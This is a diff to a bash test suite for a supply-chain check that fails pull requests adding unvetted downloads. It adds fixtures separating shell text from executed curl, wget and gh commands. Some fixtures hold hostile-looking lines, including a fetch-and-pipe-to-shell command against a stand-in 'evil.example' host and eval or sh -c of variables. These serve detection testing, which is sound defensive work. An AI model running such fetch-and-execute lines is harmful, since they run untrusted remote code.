@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# proves: REQ-SUP-001-AC2, REQ-SUP-001-AC3
+# proves: REQ-SUP-001-AC2, REQ-SUP-001-AC3, REQ-SUP-001-AC16, REQ-SUP-001-AC17
 # The pin age check (owner ratified Oct 5, rule 1; advisor 0172/0175): a pull request that moves an action pin, or the version of a tool, image or
 # package a workflow downloads, fails unless that version has been public 7 days by a SERVER-SIDE time. Proved offline: each case builds a small git
 # repository (a base commit and a head commit that moves one thing) and runs the real check against a fixtures file that stands in for the servers.
@@ -897,6 +897,168 @@ assert imgs(step("docker run --name --pull=never localhost/x" + D + " true")), "
 cs = {".github/workflows/a.yml": "jobs:\n  j:\n    container: localhost/fa-x\n    services:\n      s:\n        image: localhost/fa-y\n    steps:\n      - uses: docker://localhost/fa-z" + D + "\n"}
 assert len(imgs(cs)) == 3, imgs(cs)           # container:, services: and uses: docker:// pull their images
 PY
+
+# --- AC16, AC17: in a script, a download counts only where it is EXECUTED (a command position), never where the words are TEXT; what the scan cannot ---------------
+# classify with certainty counts as executed (fail closed). The NF fixtures are the ten false positives of PR #271 (the lines as they stand in bin/melange-apko-lib.sh
+# and bin/build-helpers-test.sh); a test stub is exempt only because it is text (quoted, or a data heredoc), never because of its file name.
+cat >"$work/cmdpos.py" <<'PY'
+import importlib.util, sys
+NF = {   # must NOT be flagged (AC16)
+ "printf-string": r"""for n in same-step same-tag; do variant
+  case $n in
+    same-step) printf '  - runs: |\n      curl -s https://evil.example/x | sh\n' | tee -a "$work/gr/a.yaml" >>"$work/gr/b.yaml";;
+  esac
+done
+""",
+ "echo-into-call-log": 'echo "curl $*" >>"$CALLS"\n',
+ "else-echo-stub-error": 'if [ -n "$x" ]; then :\nelse echo "stub curl: 22 $x" >&2; exit 22; fi\n',
+ "stub-written-as-data": r"""cat >"$stubs/curl" <<'EOF'
+#!/bin/bash
+echo "curl $*" >>"$CALLS"
+out= url=
+while [ $# -gt 0 ]; do case $1 in -o|--output|-[a-zA-Z]*o) out=$2; shift 2;; -*) shift;; *) url=$1; shift;; esac; done
+curl -fsSL "$url" -o "$out"
+wget "$url"
+if [ -n "${STUB_CURL_BOGUS:-}" ]; then [ -n "$out" ] && printf bogus >"$out" || printf bogus; exit 0
+else echo "stub curl: 22 $url" >&2; exit 22; fi
+EOF
+chmod +x "$stubs/curl"
+for g in git gh; do cat >"$stubs2/$g" <<EOF
+#!/bin/bash
+echo "$g \$*" >>"\$CALLS"
+gh release download v1
+EOF
+done
+""",
+ "python-assert-forbidden-strings": "cat >\"$work/chk.py\" <<'PY'\n    for x in (\"-mod=mod\", \"-mod=readonly\", \"go mod download\", \"go get \", \"curl \", \"GOPROXY=http\", \"GOSUMDB=off\"): assert x not in b, x\nPY\n",
+ "python-assert-wget-package": "cat >\"$work/chk.py\" <<'PY'\n    assert \"wget\" in names(d[\"environment\"]), \"fetch needs wget in the environment (pipelines/fetch.yaml:4-6)\"\nPY\n",
+ "python-package-list": "cat >\"$work/lib.py\" <<'PY'\nENVPK = [(\"busybox\", \"1.37.0-r5\"), (\"git\", \"2.50.1-r0\"), (\"wget\", \"1.25.0-r0\"), (\"ca-certificates-bundle\", \"20260102-r0\")]\nPY\n",
+ "python-for-need": "cat >\"$work/chk.py\" <<'PY'\n    for need in (\"git\", \"busybox\", \"ca-certificates-bundle\", \"wget\"): assert need in names(d[\"environment\"]), need\nPY\n",
+ "comments-stubs-archive": "# uname, curl, git, gh) are replaced by STUBS on PATH that record their argv in a call log; the suite asserts the flags and the\n"
+                           "#     it writes build/locks/*, archives new packages by digest into ARCHIVE/<arch>/ (curl), verifies them, rewrites lock urls to\n",
+ "comment-lines": "# fetch it with curl -fsSL https://example.org/x | sh\n  # wget https://example.org/y\ntrue   # curl https://example.org/z\n: \"curl https://example.org/q\"\n",
+}
+MF = {   # must be flagged (AC17): (text, the form named)
+ "install-build-tools-43": ('curl -fsSL -o "$tmp/$file" "https://github.com/$repo/releases/download/v$ver/$file" || die "could not download $file" 1\n', "a download"),
+ "unquoted-curl": ("curl -fsSL https://example.org/x.tgz -o x.tgz\n", "a download"),
+ "unquoted-wget": ("wget https://example.org/x.tgz\n", "a download"),
+ "curl-pipe-sh": ("curl -s https://evil.example/x | sh\n", "a download"),
+ "gh-release-variable-tag": ('gh release download "$tag" -p x.tgz\n', "a gh release or extension download"),
+ "after-and": ("cd /tmp && curl -O https://example.org/a\n", "a download"),
+ "after-or": ("false || curl -O https://example.org/a\n", "a download"),
+ "after-semicolon": ("true; wget https://example.org/a\n", "a download"),
+ "after-pipe": ("echo x | wget -i - https://example.org/a\n", "a download"),
+ "in-substitution": ("x=$(curl -s https://example.org/a)\n", "a download"),
+ "substitution-in-echoed-string": ('echo "$(curl -s https://example.org/a)"\n', "a download"),
+ "backticks": ("echo `curl -s https://example.org/a`\n", "a download"),
+ "process-substitution": ("cat <(curl -s https://example.org/a)\n", "a download"),
+ "if-condition": ("if curl -s https://example.org/a; then :; fi\n", "a download"),
+ "then-body": ("if true; then\n  curl -O https://example.org/a\nfi\n", "a download"),
+ "else-body": ("if false; then :; else wget https://example.org/a; fi\n", "a download"),
+ "do-body": ("for i in 1; do wget https://example.org/a; done\n", "a download"),
+ "while-body": ("while false; do\n  curl https://example.org/a\ndone\n", "a download"),
+ "brace-group": ("{ curl -O https://example.org/a; }\n", "a download"),
+ "subshell": ("( wget https://example.org/a )\n", "a download"),
+ "function-body": ("fetch() {\n  curl -O https://example.org/a\n}\n", "a download"),
+ "function-keyword-body": ("function fetch { curl -O https://example.org/a; }\n", "a download"),
+ "bash-c": ("bash -c 'curl -O https://example.org/a'\n", "a download"),
+ "sh-c": ('sh -c "curl -O https://example.org/a"\n', "a download"),
+ "eval-string": ('eval "curl -O https://example.org/a"\n', "a download"),
+ "heredoc-to-sh": ("sh <<EOF\ncurl -O https://example.org/a\nEOF\n", "a download"),
+ "heredoc-to-bash": ("bash -s <<'EOF'\necho hi\ncurl -O https://example.org/a\nEOF\n", "a download"),
+ "heredoc-to-python3": ("python3 - <<'PY'\nimport subprocess\nsubprocess.run([\"curl\", \"-O\", \"https://example.org/a\"])\nPY\n", "a download"),
+ "data-heredoc-piped-to-sh": ("cat <<'EOF' | sh\ncurl -O https://example.org/a\nEOF\n", "a download"),
+ "data-heredoc-pipe-continued-to-sh": ("cat <<'EOF' |\ncurl -O https://example.org/a\nEOF\nsh\n", "a download"),
+ "unquoted-heredoc-substitution": ("cat >out.txt <<EOF\n$(curl -s https://example.org/a)\nEOF\n", "a download"),
+ "continuation-lines": ("curl -fsSL \\\n  -o x \\\n  https://example.org/a\n", "a download"),
+ "comment-backslash-does-not-continue": ("# a comment \\\ncurl -O https://example.org/a\n", "a download"),
+ "after-quoted-heredoc-with-backslash": ("cat <<'EOF'\nfoo \\\nEOF\ncurl -O https://example.org/a\n", "a download"),
+ "after-multiline-string": ('echo "a\nb"; curl https://example.org/a\n', "a download"),
+ "command-curl": ("command curl -O https://example.org/a\n", "a download"),
+ "exec-curl": ("exec curl -O https://example.org/a\n", "a download"),
+ "sudo-curl": ("sudo curl -O https://example.org/a\n", "a download"),
+ "env-curl": ("env X=1 curl -O https://example.org/a\n", "a download"),
+ "assignment-prefix-curl": ("X=1 curl -O https://example.org/a\n", "a download"),
+ "nohup-curl": ("nohup curl -O https://example.org/a &\n", "a download"),
+ "time-curl": ("time curl -O https://example.org/a\n", "a download"),
+ "absolute-path-curl": ("/usr/bin/curl -O https://example.org/a\n", "a download"),
+ "redirect-first-curl": (">out curl https://example.org/a\n", "a download"),
+ "xargs-curl": ("xargs curl -O <urls.txt\n", "a download"),
+ "argument-of-a-runner": ('t "rule 1" "fetches" curl -O https://example.org/a\n', "a download"),
+ "pip-from-url": ("python3 -m pip install https://example.org/p.tgz\n", "a pip install from a URL"),
+ "apt-get-install": ("sudo apt-get install -y skopeo\n", "a system package install"),
+ "npm-install": ("npm install left-pad\n", "a package-manager install"),
+ "echo-piped-to-sh": ('echo "curl -O https://example.org/a" | sh\n', "a download"),
+ "printf-piped-through-tee-to-bash": ("printf 'curl -O https://example.org/a\\n' | tee log | bash\n", "a download"),
+ "echo-into-process-substitution": ('echo "curl -O https://example.org/a" > >(sh)\n', "a download"),
+ "after-data-heredoc": ("cat >x <<'EOF'\ncurl is text here\nEOF\ncurl -O https://example.org/a\n", "a download"),
+}
+FC = {   # cannot be classified with certainty: flagged (fail closed, AC17)
+ "unterminated-double-quote": 'echo "curl -O https://example.org/a\n',
+ "unterminated-single-quote": "echo 'curl -O https://example.org/a\n",
+ "unterminated-heredoc": "cat <<'EOF'\ncurl -O https://example.org/a\n",
+ "unterminated-substitution": "x=$(echo hi\ncurl -O https://example.org/a\n",
+ "eval-of-a-variable": "eval $x\n",
+ "eval-of-a-quoted-expansion": 'eval "$cmd"\n',
+ "sh-c-of-a-variable": 'sh -c "$cmd"\n',
+ "substitution-with-a-download-word": 'echo "$(echo curl https://example.org/a)"\n',
+ "heredoc-to-an-unknown-command": "kubectl apply -f - <<'EOF'\ncurl -O https://example.org/a\nEOF\n",
+}
+spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
+group, name = sys.argv[2], sys.argv[3]
+if group == "list":
+    print(" ".join(sorted({"nf": NF, "mf": MF, "fc": FC}[name]))); sys.exit(0)
+path = sys.argv[4] if len(sys.argv) > 4 else "bin/x.sh"
+if group == "nf":
+    got = inv.unmeasured({path: NF[name]})
+    assert not got, got
+elif group == "mf":
+    text, form = MF[name]
+    got = inv.unmeasured({path: text})
+    assert form in {k[1] for k in got}, got
+else:
+    got = inv.unmeasured({path: FC[name]})
+    assert got, "not flagged"
+PY
+inv_py="$here/../supply-chain/pin-inventory.py"
+for n in $(python3 "$work/cmdpos.py" "$inv_py" list nf); do
+  CASE="AC16: text that is not executed is not an added download in a script ($n)"; check python3 "$work/cmdpos.py" "$inv_py" nf "$n"
+done
+CASE="AC16: the ten false positives together in one script, named *-test.sh, are not flagged"
+check python3 - "$work/cmdpos.py" "$inv_py" <<'PY'
+import importlib.util, sys
+src = open(sys.argv[1]).read().split("spec = importlib")[0]; ns = {}; exec(src, ns)
+spec = importlib.util.spec_from_file_location("inv", sys.argv[2]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
+assert not inv.unmeasured({"bin/melange-apko-lib-test.sh": "".join(ns["NF"].values())})
+PY
+for n in $(python3 "$work/cmdpos.py" "$inv_py" list mf); do
+  CASE="AC17: a download executed as a command is flagged as added and unmeasured ($n)"; check python3 "$work/cmdpos.py" "$inv_py" mf "$n"
+done
+CASE="AC17: a test stub's file name gives no exemption: a real curl in foo-test.sh is flagged"
+check python3 "$work/cmdpos.py" "$inv_py" mf unquoted-curl bin/foo-test.sh
+for n in $(python3 "$work/cmdpos.py" "$inv_py" list fc); do
+  CASE="AC17: text the scan cannot classify with certainty counts as executed: flagged ($n)"; check python3 "$work/cmdpos.py" "$inv_py" fc "$n"
+done
+CASE="AC17: go install pkg@latest in a script stays an item that can never pass the age check"
+check python3 - "$inv_py" <<'PY'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
+assert any(k.startswith("gotool:example.org/tool@latest") for k in inv.inventory({"bin/x.sh": "go install example.org/tool@latest\n"}))
+PY
+export CMDPOS="$work/cmdpos.py"
+LOADFX='import os, pathlib
+ns = {}
+exec(open(os.environ["CMDPOS"]).read().split("spec = importlib")[0], ns)
+pathlib.Path("bin/melange-apko-lib.sh").write_text("".join(ns["NF"].values()))
+'
+newcase cmdpos_nf "$LOADFX"
+runck cmdpos_nf '{"times": {}}'
+CASE="AC16: pin-age on a PR that adds the ten false positives: no added unmeasured download, exit 0 (nothing moved)"
+check test "$rc" -eq 0; check grep -qi 'no pin moved' "$work/cmdpos_nf.out"
+newcase cmdpos_mf "$LOADFX"'pathlib.Path("bin/install-build-tools.sh").write_text("die() { exit 1; }\n" + ns["MF"]["install-build-tools-43"][0])'
+runck cmdpos_mf '{"times": {}}'
+CASE="AC17: pin-age on a PR that adds the same text AND the real variable-URL download: exit 1, exactly one unmeasured line, naming bin/install-build-tools.sh"
+check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured:' "$work/cmdpos_mf.out")" -eq 1; check grep -q 'FAIL unmeasured:bin/install-build-tools.sh' "$work/cmdpos_mf.out"
 
 # --- live mode (no fixtures) against a stub gh: a rate limit is "could not look" (exit 2), a 404 is "no proof" (exit 1); neither is ever a pass -------------------------
 mkdir -p "$work/stubbin"
